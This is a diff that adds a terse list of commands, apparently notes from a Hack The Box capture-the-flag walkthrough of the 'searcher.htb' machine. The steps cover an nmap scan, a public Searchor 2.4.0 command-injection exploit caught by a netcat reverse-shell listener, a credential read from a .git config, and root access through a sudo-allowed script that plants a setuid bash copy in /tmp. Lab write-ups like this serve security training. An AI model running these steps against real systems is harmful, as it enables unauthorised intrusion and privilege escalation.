@@ -1,5 +1,38 @@
 ```
 nmap -sS -sC -sV -T5 -Pn 10.10.11.208
+http://searcher.htb/
+Searchor 2.4.0
+https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection
+nc -lvnp 9001
+./exploit.sh searcher.htb 10.10.14.6
+./LinEnum.sh
+ls –la
+cat /var/www/app/.git/config
+ssh svc@10.10.11.208
+http://gitea.searcher.htb/
+http://gitea.searcher.htb/explore/users
+sudo –l
+ls -l /opt/scripts/system-checkup.py
+sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
+sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
+sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect
+sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea | jq
+http://gitea.searcher.htb/
+Login as administrator
+http://gitea.searcher.htb/administrator/scripts
+cd /opt/scripts/
+sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
+cd /tmp
+echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchmod 4777 /tmp/0xdf' > full-checkup.sh
+chmod +x full-checkup.sh
+sudo python3 /opt/scripts/system-checkup.py full-checkup
+ls -l /tmp/0xdf
+/tmp/0xdf -p
+```
+
+
+```
+nmap -sS -sC -sV -T5 -Pn 10.10.11.208
 ```
 ![image](https://github.com/user-attachments/assets/b87356b0-328d-4e3f-9d77-9931a3f05397)
 
